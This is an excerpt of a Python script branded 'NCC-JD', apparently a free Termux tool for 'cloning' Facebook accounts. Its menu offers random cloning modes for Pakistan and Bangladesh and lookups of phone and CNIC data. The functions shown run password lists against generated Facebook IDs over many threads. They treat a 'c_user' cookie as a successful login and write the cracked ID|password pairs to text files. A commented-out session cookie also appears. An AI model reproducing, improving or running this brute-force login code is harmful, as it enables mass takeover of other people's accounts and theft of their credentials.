...
\33[1;92m===========================================================
   Owner      :  Md. Jahidul Islam
   Facebook   :  Md. Jahidul islam
   Github     :  NCC-JD-2-0
   Tool Type  :  \x1b[1;91mFREE
\x1b[1;92m   Version    :  24.31.01
\33[1;92m===========================================================""")
...
def menu():
			...
			print('[A] File Cloning menu')

			print('[B] Pak Random Cloning menu')

			print('[C] BD  Random Cloning menu')

			print('[D] Random Choice Pass ')

			print('[E] Get any  number data')

			print('[F] Get any CNIC number data')

			print('[G] Follow me on Facebook')
			...
			if rifat in ['A']:
				...
				os.system('xdg-open https://www.facebook.com/jahidul0999?mibextid=ZbWKwL');menu()
...
def mmm(ids,names,passlist):
	...
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mNCC-JD\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[NCC-JD-OK] '+ids+' | '+pas+'\033[1;32m')

				open('/sdcard/NCC-JD-OK.txt', 'a').write(ids+'|'+pas+'\n')
				...
				if 'y' in pcp:
					...
					print('\33[1;31m[NCC-JD-CP] '+ids+' | '+pas+'\33[0;97m')

					open('/sdcard/NCC-JD-CP.txt', 'a').write(ids+'|'+pas+'\n')
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					...
					print('\33[1;91m[NCC-JD-CP] '+ids+' | '+pas+'\33[0;97m')
...
def random_number1():
	...
	print(' Example : 2000,5000,10000,20000')
...
def bd():
	...
	print('\x1b[1;92m[1] BD Randm Method\x1b[1;91m [1]')

	print('\x1b[1;92m[2] BD Randm Method \x1b[1;91m[2]')

	print('\x1b[1;92m[3] BD Randm Method \x1b[1;91m[3]')
...
def bd1():
	...
	kode = input('[+]\033[1;92m CELACT SIM CODE : ')
	...
	limit = int(input('[+] \033[1;92mPutt Your Idz lemit :  '))
	...
	with ThreadPool(max_workers=35) as yaari:
		...
		print('\x1b[1;91m If ID NOT COME [ON/OFF] AIRPLANE MODE')
...
def bd2():
	...
	kode = input('[+]\033[1;92m PUT YOUR SIM CODE : ')
...
def fcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=FbE0ZfGyA_fA-J-Lp9bT-Ghz; sb=FbE0Zbk_QEKlHVTLsvWxuaGi; m_pixel_ratio=1.7000000476837158; wd=424x867; fr=0AcfWCPyX75qLV6mv..BlNLEV.9m.AAA.0.0.BlNLIW.AWWfdOaGxXU',
    ...
    'viewport-width': '980',}
			...
			if 'c_user' in log_cookies:
				...
				print('\033[1;92m[NCC-JD-OK] '+cid+' | '+ps+'\033[1;32m')

				open('NCC-JD-OK.txt', 'a').write(cid+' | '+ps+'\n')
				...
				print('\33[1;31m[NCC-JD-CP] '+cid+' | '+ps+'\33[0;97m')

				open('NCC-JD-CP.txt', 'a').write(cid+' | '+ps+'\n')
